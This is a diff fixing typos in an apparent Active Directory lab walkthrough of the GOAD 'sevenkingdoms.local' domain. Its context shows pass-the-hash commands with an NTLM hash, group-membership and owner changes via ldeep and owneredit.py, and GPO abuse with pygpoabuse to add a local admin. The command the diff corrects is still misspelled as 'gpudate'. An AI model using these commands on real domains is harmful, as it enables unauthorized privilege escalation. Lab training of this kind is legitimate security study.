@@ -281,22 +281,22 @@ ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkin
 ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://192.168.56.10 add_to_group "CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local" "CN=DragonStone,OU=Crownlands,DC=sevenkingdoms,DC=local"
 ```
 
-## WriteOwner on Group (dragonstone -> kingsgard)
+## WriteOwner on Group (dragonstone -> kingsguard)
 
-- Now with the writeOwner privilege we can change the owner of kingsgard to own the group
+- Now with the writeOwner privilege we can change the owner of kingsguard to own the group
 
 ![acl_write_owner.png](/assets/blog/GOAD/acl_write_owner.png)
 
 - Just like before we will use the impacket [fork](https://github.com/ThePorgs/impacket)
 
 ```bash
-owneredit.py -action read -target 'kingsgard' -hashes ':b3b3717f7d51b37fb325f7e7d048e998' sevenkingdoms.local/tyron.lannister
-owneredit.py -action write -owner 'tyron.lannister' -target 'kingsgard' -hashes ':b3b3717f7d51b37fb325f7e7d048e998' sevenkingdoms.local/tyron.lannister
+owneredit.py -action read -target 'kingsguard' -hashes ':b3b3717f7d51b37fb325f7e7d048e998' sevenkingdoms.local/tyron.lannister
+owneredit.py -action write -owner 'tyron.lannister' -target 'kingsguard' -hashes ':b3b3717f7d51b37fb325f7e7d048e998' sevenkingdoms.local/tyron.lannister
 ```
 
 ![acl_changeowner.png](/assets/blog/GOAD/acl_changeowner.png)
 
-- And the owner of kingsgard group is now tyron.lannister
+- And the owner of kingsguard group is now tyron.lannister
 - As owner of the group we can now change the acl and give us GenericAll on the group
 
 ```bash
@@ -430,7 +430,7 @@ python3 pygpoabuse.py north.sevenkingdoms.local/samwell.tarly:'Heartsbane' -gpo-
 
 ![acl_gpo_abuse_schedule_task_result.png](/assets/blog/GOAD/acl_gpo_abuse_schedule_task_result.png)
 
-- If we wait few minutes or if we run a `gpudate -force` we will see the new local admin user
+- If we wait few minutes or if we run a `gpudate /force` we will see the new local admin user
 
 ![acl_gpo_abuse_schedule_task_adduser.png](/assets/blog/GOAD/acl_gpo_abuse_schedule_task_adduser.png)
 
